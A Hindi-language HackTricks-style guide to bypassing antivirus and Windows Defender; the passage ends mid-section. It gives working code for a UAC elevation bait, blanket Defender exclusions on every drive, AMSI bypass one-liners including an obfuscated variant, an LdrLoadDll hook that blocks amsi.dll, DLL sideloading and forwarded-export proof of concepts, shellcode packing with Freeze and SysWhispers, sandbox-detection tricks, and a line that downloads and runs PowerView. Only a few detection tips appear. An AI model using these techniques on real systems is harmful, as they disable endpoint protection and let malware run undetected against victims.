# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज मूल रूप से** [**@m2rc_p**](https://twitter.com/m2rc_p)** ने लिखा था!**

## Defender रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV का रूप धरकर Windows Defender को काम करने से रोकने वाला टूल।
- [अगर आप admin हैं, तो Defender को disable करें](basic-powershell-for-pentesters/README.md)

### Defender से छेड़छाड़ करने से पहले installer-style UAC bait

Game cheats के रूप में सामने आने वाले सार्वजनिक loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **user से elevation की अनुमति माँगते हैं** और फिर Defender को निष्क्रिय करते हैं। प्रक्रिया सरल है:

1. `net session` से जाँचें कि संदर्भ administrative है या नहीं। यह command केवल तभी सफल होता है जब caller के पास admin rights हों, इसलिए इसके विफल होने का अर्थ है कि loader standard user के रूप में चल रहा है।
2. मूल command line को बरकरार रखते हुए, अपेक्षित UAC consent prompt दिखाने के लिए इसे `RunAs` verb के साथ तुरंत दोबारा launch करें।

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

पीड़ित पहले से ही मानते हैं कि वे “cracked” software इंस्टॉल कर रहे हैं, इसलिए वे आमतौर पर prompt स्वीकार कर लेते हैं, जिससे malware को Defender की policy बदलने के लिए ज़रूरी अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए व्यापक `MpPreference` exclusions

Elevated access मिलने के बाद, GachiLoader-style chains service को पूरी तरह बंद करने के बजाय Defender के blind spots को अधिकतम करते हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को समाप्त करता है और फिर **बेहद व्यापक exclusions** लागू करता है, ताकि हर user profile, system directory और removable disk को scan न किया जा सके:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

मुख्य अवलोकन:

- लूप हर mounted filesystem (D:\, E:\, USB sticks आदि) पर चलता है, इसलिए **डिस्क पर कहीं भी रखे गए भविष्य के किसी भी payload को अनदेखा किया जाता है**।
- `.sys` extension का exclusion भविष्य को ध्यान में रखकर है—हमलावर बाद में Defender को दोबारा छुए बिना unsigned drivers लोड करने का विकल्प सुरक्षित रखते हैं।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत किए जाते हैं, जिससे बाद के stages यह पुष्टि कर सकते हैं कि exclusions बने हुए हैं या उन्हें UAC को दोबारा trigger किए बिना बढ़ा सकते हैं।

क्योंकि Defender की कोई service बंद नहीं की जाती, साधारण health checks यह रिपोर्ट करते रहते हैं कि “antivirus active” है, जबकि वास्तविकता में real-time inspection उन paths को छूता ही नहीं।<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

वर्तमान में, AVs यह जाँचने के लिए अलग-अलग तरीके इस्तेमाल करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis, और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection में binary या script में ज्ञात malicious strings या bytes के arrays को flag किया जाता है, और file से ही जानकारी भी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum आदि)। इसका अर्थ है कि ज्ञात public tools का उपयोग करने पर आपके पकड़े जाने की संभावना बढ़ सकती है, क्योंकि संभवतः उनका analysis करके उन्हें malicious के रूप में flag किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary को encrypt करते हैं, तो AV के पास आपके program का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको program को memory में decrypt करके चलाने के लिए किसी तरह के loader की आवश्यकता होगी।

- **Obfuscation**

कभी-कभी AV से बच निकलने के लिए आपको अपनी binary या script में कुछ strings बदलने की ही ज़रूरत होती है, लेकिन आप क्या obfuscate करने की कोशिश कर रहे हैं, इसके आधार पर यह काम समय लेने वाला हो सकता है।

- **Custom tooling**

अगर आप अपने tools खुद विकसित करते हैं, तो उनके लिए कोई ज्ञात bad signatures नहीं होंगे, लेकिन इसमें बहुत समय और मेहनत लगती है।

> [!TIP]
> Windows Defender की static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह मूलतः file को कई segments में बाँटता है और फिर Defender से हर segment को अलग-अलग scan करवाता है। इस तरह यह आपको बता सकता है कि आपकी binary में कौन-सी strings या bytes flag की गई हैं।

मैं इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखने की पुरज़ोर सलाह देता हूँ, जिसमें व्यावहारिक AV Evasion के बारे में बताया गया है।

### Static classifiers के लिए offline PE-feature tests

Packed या encrypted payload bytes, static classifier के लिए केवल एक input हैं। EMBER2024, imports, exports, sections, headers और Authenticode data सहित PE features निकालता है।<sup>[[48]](#references)</sup> एक loader experiment में, benign दिखने वाले 141 imports जोड़ने से EMBER2024 का malicious score 93% कम हुआ, जबकि malware से जुड़े imports ने score बढ़ा दिया। यह उस model और उन samples का परिणाम है, किसी खास AV/EDR product को विश्वसनीय रूप से bypass करने का तरीका नहीं।<sup>[[50]](#references)</sup>

किसी अधिकृत loader test के लिए, payload और execution path को स्थिर रखें, हर variant में एक ही इच्छित build variable बदलें, और scores की offline तुलना करें। PE features की जाँच करें, क्योंकि build में बदलाव एक से अधिक feature groups को प्रभावित कर सकता है।<sup>[[49]](#references)[[50]](#references)</sup> इच्छित imports को IAT में बनाए रखने के लिए, चुने गए Win32 APIs को reachable code से call करें। चयन में बदलाव करें और call sites को अलग-अलग builds में बाँटें; इसकी जगह कोई fixed camouflage function न बनाएँ, जो signature बन सकता है। Experiment में valid code signing, export entries और `.pdata` को बड़ा करने वाले अधिक functions के साथ scores कम होने की भी रिपोर्ट दी गई; invalid signing का बहुत कम प्रभाव था और `.pdata` का प्रभाव छोटा था।<sup>[[50]](#references)</sup>

`thrember` package feature extraction और benchmark models उपलब्ध कराता है। इसे install करने के बाद, पहले से मौजूद `models` directory के साथ `thrember.download_models("models")` का उपयोग करें, फिर scorer को उसकी parent directory से चलाएँ: download helper current working directory बदल देता है। PE classifier, files को scanning service पर submit किए बिना, builds की किसी directory को score कर सकता है:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

तुलना के दौरान model और feature-extractor के versions को स्थिर रखें। कम offline score सिर्फ़ यह दिखाता है कि यह classifier बदले हुए binary पर कैसी प्रतिक्रिया देता है; इससे behavioral analysis, emulation या किसी vendor के अलग model से बच निकलना साबित नहीं होता।<sup>[[49]](#references)[[50]](#references)</sup> [virtualized payloads में per-build polymorphism और outer-binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) के लिए, अलग execution model देखें।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपके binary को sandbox में चलाता है और malicious activity पर नज़र रखता है (जैसे, आपके browser के passwords को decrypt करके पढ़ने की कोशिश करना, LSASS पर minidump करना आदि)। इस हिस्से के साथ काम करना थोड़ा पेचीदा हो सकता है, लेकिन sandboxes से बचने के लिए आप ये कुछ चीज़ें कर सकते हैं।

- **Execution से पहले sleep करना** इसे लागू करने के तरीके के आधार पर, यह AV की dynamic analysis को bypass करने का एक बढ़िया तरीका हो सकता है। AV के पास files को scan करने के लिए बहुत कम समय होता है, ताकि user के workflow में रुकावट न आए। इसलिए, लंबे समय तक sleep करने से binaries का analysis बाधित हो सकता है। समस्या यह है कि कई AV sandboxes इसे लागू करने के तरीके के आधार पर sleep को छोड़ सकते हैं।
- **मशीन के resources की जाँच करना** आम तौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे, < 2GB RAM), वरना वे user की मशीन को धीमा कर सकते हैं। आप यहाँ काफ़ी रचनात्मक भी हो सकते हैं; उदाहरण के लिए, CPU का temperature या fan की speed जाँचें। Sandbox में हर चीज़ implement नहीं होगी।
- **मशीन-विशिष्ट जाँचें** अगर आप ऐसे user को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो आप computer का domain जाँचकर देख सकते हैं कि वह आपके बताए domain से मेल खाता है या नहीं। अगर मेल न खाए, तो आप अपने program को exit करवा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox computername का नाम HAL9TH है। इसलिए, detonation से पहले आप अपने malware में computer name जाँच सकते हैं। अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के sandbox में हैं; ऐसे में आप अपने program को exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के ख़िलाफ़ काम करने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ और बेहतरीन सुझाव

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** का आख़िरकार **पता चल ही जाता है**, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो **क्या आपको सचमुच mimikatz इस्तेमाल करने की ज़रूरत है**? या फिर आप कोई दूसरा, कम जाना-पहचाना project इस्तेमाल कर सकते हैं जो LSASS dump भी करता हो?

शायद दूसरा विकल्प ही सही है। उदाहरण के तौर पर mimikatz को लें: यह शायद AVs और EDRs द्वारा सबसे ज़्यादा flagged malware में से एक है। Project खुद भले ही बहुत बढ़िया हो, लेकिन AVs से बचने के लिए इसके साथ काम करना बेहद मुश्किल है। इसलिए, आप जो हासिल करना चाहते हैं, उसके लिए विकल्प तलाशें।

> [!TIP]
> Evasion के लिए अपने payloads में बदलाव करते समय, Defender में **automatic sample submission बंद करना** सुनिश्चित करें। और कृपया, अगर आपका लक्ष्य लंबे समय तक evasion हासिल करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। अगर आप जाँचना चाहते हैं कि किसी खास AV को आपका payload detect होता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और नतीजे से संतुष्ट होने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs के इस्तेमाल को प्राथमिकता दें**। मेरे अनुभव में, DLL files आम तौर पर **बहुत कम detect और analyze की जाती हैं**। इसलिए, कुछ मामलों में detection से बचने के लिए यह एक आसान तरकीब है (बशर्ते आपका payload DLL के रूप में चलने का कोई तरीका रखता हो)।

जैसा कि हम इस image में देख सकते हैं, Havoc के DLL Payload का antiscan.me पर detection rate 4/26 है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>एक सामान्य Havoc EXE payload और एक सामान्य Havoc DLL की antiscan.me तुलना</p></figcaption></figure>

अब हम DLL files के साथ इस्तेमाल की जा सकने वाली कुछ तरकीबें दिखाएँगे, ताकि आप और ज़्यादा stealthy रह सकें।

## DLL Sideloading & Proxying

**DLL Sideloading**, loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फ़ायदा उठाता है। इसके लिए victim application और malicious payload(s) को एक ही जगह पर रखा जाता है।

[Siofra](https://github.com/Cybereason/siofra) और नीचे दी गई powershell script का इस्तेमाल करके, आप DLL Sideloading के प्रति संवेदनशील programs की जाँच कर सकते हैं:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

यह command "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील programs और उन DLL files की सूची देगा जिन्हें वे load करने की कोशिश करते हैं।

मैं अत्यधिक recommend करता हूँ कि आप **DLL Hijackable/Sideloadable programs को खुद explore करें**। सही तरीके से करने पर यह technique काफी stealthy होती है, लेकिन अगर आप सार्वजनिक रूप से ज्ञात DLL Sideloadable programs का इस्तेमाल करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

सिर्फ़ किसी program द्वारा load की जाने वाली अपेक्षित name वाली malicious DLL रखने से आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ विशेष functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक और technique का इस्तेमाल करेंगे।

**DLL Proxying** program द्वारा की गई calls को proxy (और malicious) DLL से original DLL तक forward करता है। इससे program की functionality बनी रहती है और आपका payload execute हो पाता है।

मैं [@flangvik](https://twitter.com/flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का इस्तेमाल करूँगा।

मैंने ये steps अपनाए:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

आखिरी कमांड हमें 2 फ़ाइलें देगा: एक DLL source code template और मूल renamed DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode (जिसे [SGN](https://github.com/EgeBalci/sgn) से encode किया गया है) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे सफल कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **पुरज़ोर अनुशंसा करता हूँ** कि DLL Sideloading के बारे में जानने के लिए आप [S3cur3Th1sSh1t का twitch VOD](https://www.twitch.tv/videos/1644171543) और [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें, ताकि हमने जिस विषय पर चर्चा की है, उसे और गहराई से समझ सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर संकेत करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में ASCII string होती है। जब कोई caller इस export को resolve करता है, तो Windows loader:

- `TargetDll` को load करता है, यदि वह पहले से loaded न हो
- उसमें से `TargetFunc` को resolve करता है

समझने योग्य मुख्य व्यवहार:
- यदि `TargetDll` एक KnownDLL है, तो उसे सुरक्षित KnownDLLs namespace से उपलब्ध कराया जाता है (जैसे ntdll, kernelbase, ole32)।<sup>[[15]](#references)</sup>
- यदि `TargetDll` एक KnownDLL नहीं है, तो सामान्य DLL search order का उपयोग होता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

इससे एक अप्रत्यक्ष sideloading primitive संभव होता है: ऐसी signed DLL ढूँढें जो किसी non-KnownDLL module name पर forwarded function export करती हो, फिर उस signed DLL के साथ उसी directory में attacker-controlled DLL रखें जिसका नाम ठीक forwarded target module जैसा हो। जब forwarded export invoke किया जाता है, तो loader forward को resolve करके आपकी DLL को उसी directory से load करता है और आपका DllMain execute करता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे सामान्य search order के ज़रिए resolve किया जाता है।

PoC (copy-paste):
1) Signed system DLL को किसी writable folder में कॉपी करें.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक दुर्भावनापूर्ण `NCRYPTPROV.dll` रखें। Code execution के लिए एक न्यूनतम DllMain पर्याप्त है; DllMain को trigger करने के लिए forwarded function को implement करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) signed LOLBin के साथ forward को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

देखा गया व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) लोड करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` लोड करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं किया गया है, तो "missing API" error केवल `DllMain` के चलने के बाद मिलेगा

खोज के सुझाव:
- forwarded exports पर ध्यान दें, जहां target module KnownDLL न हो। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध हैं।
- आप निम्न जैसे tooling से forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Candidates खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense के सुझाव:
- उन LOLBins (जैसे, rundll32.exe) पर नज़र रखें जो non-system paths से signed DLLs लोड करते हैं, और फिर उसी directory से समान base name वाले non-KnownDLLs लोड करते हैं
- ऐसी process/module chains पर alert करें: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के अंतर्गत `NCRYPTPROV.dll`
- Code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute की अनुमति न दें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze का इस्तेमाल करके आप अपने shellcode को stealthy तरीके से लोड और execute कर सकते हैं।

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस cat-and-mouse game है; आज जो काम करता है, वह कल detect हो सकता है। इसलिए कभी भी सिर्फ़ एक tool पर निर्भर न रहें; अगर संभव हो, तो कई evasion techniques को chain करके आज़माएँ।

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs बना सकते हैं, जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।<sup>[[32]](#references)</sup>

**Invocation विकल्प:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (कोई `ntdll` export hit नहीं होता)।
- **Indirect**: `ntdll` के अंदर मौजूद `syscall` gadget पर jump करें, ताकि kernel transition `ntdll` से शुरू होता हुआ दिखाई दे (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call पर pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को उनके virtual address के अनुसार sort करके SSN का अनुमान लगाएँ।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSN पढ़ें, फिर उसे unmap करें (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ जोड़ें, जब stub clean हो; hooked होने पर VA inference पर fallback करें।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करें और runtime पर `EAX` से SSN capture करने के लिए VEH का उपयोग करें, hooked bytes को parse किए बिना।

SysWhispers4 उपयोग का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **डिस्क पर मौजूद फ़ाइलों** को स्कैन कर सकते थे। इसलिए, अगर आप किसी तरह payloads को **सीधे in-memory** execute कर पाते, तो AV उसे रोकने के लिए कुछ नहीं कर पाता, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI या ActiveX installation को elevate करना)
- PowerShell (scripts, interactive use और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

इससे antivirus solutions को script contents ऐसे रूप में मिलते हैं जो unencrypted और unobfuscated होता है, और वे script behavior का निरीक्षण कर सकते हैं।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में यह alert दिखाई देगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` जोड़ता है और फिर उस executable का path देता है जिससे script चला था। इस मामले में, वह powershell.exe है।

हमने डिस्क पर कोई फ़ाइल नहीं डाली, लेकिन फिर भी AMSI की वजह से in-memory पकड़े गए।

इसके अलावा, **.NET 4.8** से C# code भी AMSI से गुज़रता है। इससे `Assembly.Load(byte[])` का in-memory execution के लिए इस्तेमाल करना भी प्रभावित होता है। इसीलिए, अगर आप AMSI से बचते हुए in-memory execution करना चाहते हैं, तो .NET के पुराने versions (जैसे 4.7.2 या उससे पुराने) इस्तेमाल करने की सलाह दी जाती है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

AMSI मुख्य रूप से static detections पर काम करता है, इसलिए load करने की कोशिश में मौजूद scripts को बदलना detection से बचने का अच्छा तरीका हो सकता है।

हालाँकि, AMSI कई layers वाली obfuscation के बाद भी scripts को unobfuscate कर सकता है, इसलिए इसे किस तरह किया गया है, उसके आधार पर obfuscation एक खराब विकल्प हो सकता है। इससे बचना इतना सीधा नहीं रहता। फिर भी, कभी-कभी आपको बस कुछ variable names बदलने होते हैं और काम हो जाता है। इसलिए, यह इस पर निर्भर करता है कि किसी चीज़ को किस हद तक flag किया गया है।

- **AMSI Bypass**

AMSI को powershell (और cscript.exe, wscript.exe आदि) process में DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में चलने पर भी इसके साथ आसानी से छेड़छाड़ की जा सकती है। AMSI के implementation में इस flaw के कारण, researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Error को force करना**

AMSI initialization को fail करने के लिए force करने (`amsiInitFailed`) से मौजूदा process के लिए कोई scan शुरू नहीं होगा। इसे सबसे पहले [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने इसके व्यापक इस्तेमाल को रोकने के लिए एक signature विकसित किया है।

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI को मौजूदा PowerShell process के लिए अनुपयोगी बनाने के लिए PowerShell code की सिर्फ़ एक line काफ़ी थी। बेशक, इस line को खुद AMSI ने flag कर दिया है, इसलिए इस technique का इस्तेमाल करने के लिए इसमें कुछ बदलाव करने होंगे।

यहाँ एक modified AMSI bypass है, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

ध्यान रखें कि यह पोस्ट प्रकाशित होने के बाद संभवतः फ़्लैग हो जाएगी, इसलिए अगर आपकी योजना undetected रहने की है, तो कोई भी code प्रकाशित न करें।

**Memory Patching**

यह technique सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने खोजी थी। इसमें amsi.dll में "AmsiScanBuffer" function (जो user द्वारा दिए गए input को scan करने के लिए ज़िम्मेदार है) का address ढूँढ़कर उसे ऐसे instructions से overwrite किया जाता है जो E_INVALIDARG का code लौटाते हैं। इस तरह, वास्तविक scan का result 0 लौटाता है, जिसे clean result माना जाता है।

> [!TIP]
> अधिक विस्तृत जानकारी के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell से AMSI को bypass करने के लिए कई अन्य techniques भी इस्तेमाल की जाती हैं। इनके बारे में अधिक जानने के लिए [**यह पेज**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**यह repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### amsi.dll को load होने से रोककर AMSI को block करना (LdrLoadDll hook)

AMSI तभी initialised होता है जब `amsi.dll` मौजूदा process में load होता है। एक मज़बूत, language‑agnostic bypass के लिए `ntdll!LdrLoadDll` पर user-mode hook लगाया जाता है, जो अनुरोधित module `amsi.dll` होने पर error लौटाता है। नतीजतन, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation की रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और custom loaders में काम करता है (ऐसी कोई भी चीज़ जो अन्यथा AMSI लोड करेगी)।
- लंबी command-line कलाकृतियों से बचने के लिए इसे stdin के ज़रिए scripts देने के साथ इस्तेमाल करें (`PowerShell.exe -NoProfile -NonInteractive -Command -`)।
- इसे LOLBins के ज़रिए चलाए गए loaders में इस्तेमाल होते देखा गया है (उदाहरण के लिए, `regsvr32` द्वारा `DllRegisterServer` को कॉल करना)।

टूल **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** भी AMSI को bypass करने के लिए script जनरेट करता है।
टूल **[https://amsibypass.com/](https://amsibypass.com/)** भी AMSI को bypass करने के लिए ऐसी script जनरेट करता है जो randomized user-defined function, variables और character expression का इस्तेमाल करके signature से बचती है, और signature से बचने के लिए PowerShell keywords में characters का random casing लागू करती है।

**पता लगाए गए signature को हटाएँ**

